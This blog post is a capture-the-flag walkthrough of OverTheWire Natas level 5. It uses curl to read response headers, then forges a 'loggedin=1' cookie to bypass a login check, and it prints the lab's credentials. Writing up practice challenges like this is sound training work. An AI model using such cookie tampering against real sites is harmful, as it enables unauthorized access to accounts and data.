---
title: OverTheWire Natas Level 4 -> 5
author: Michael McDonagh
pubDatetime: 2025-03-03T20:30:00Z
slug: overthewire-natas-5
featured: false
draft: false
tags:
  - overthewire
  - natas
  - web
ogImage: ""
description: Solution for OverTheWire Natas level 5 challenge.
---

## Description

Username: natas5  

URL:      <http://natas5.natas.labs.overthewire.org>

---

## Solution

Solution for the Overthewire.org [Natas level 4 -> Level 5](https://overthewire.org/wargames/natas/natas5.html)

Visit the url `http://natas5.natas.labs.overthewire.org` in the browser and we get a prompt for login.

Use the username `natas5` and the password obtained from the previous challenge.

Once logged in we get an `Access disallowed` message.

![Natas 5 home page](@/assets/images/overthewire/natas/natas05_home.png)

Checking the source code does not give any new information.

In the previous challenge we looked at the `HTTP headers` so let's check them again.

Using `curl --head --user <USERNAME>:<PASSWORD> --url <URL>` syntax we can view the headers.

```bash
$ curl --head --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --url http://nata
s5.natas.labs.overthewire.org

HTTP/1.1 200 OK
Date: Wed, 20 Apr 2022 23:55:42 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: loggedin=0
Content-Type: text/html; charset=UTF-8

```

We can see in the headers that there is a cookie being set.  
`Set-Cookie: loggedin=0`

Let's set `loggedin` to 1 and see what differences occur.
We can passed cookie data using the `--cookie` option in curl.

```bash
curl --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie "loggedin=1" --url http:/
/natas5.natas.labs.overthewire.org/
```

The response we get tells us Access granted and the password.

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is aGoY4q**************************</div>
</body>
</html>
```

The password for the next challenge is `aGoY4q**************************`.
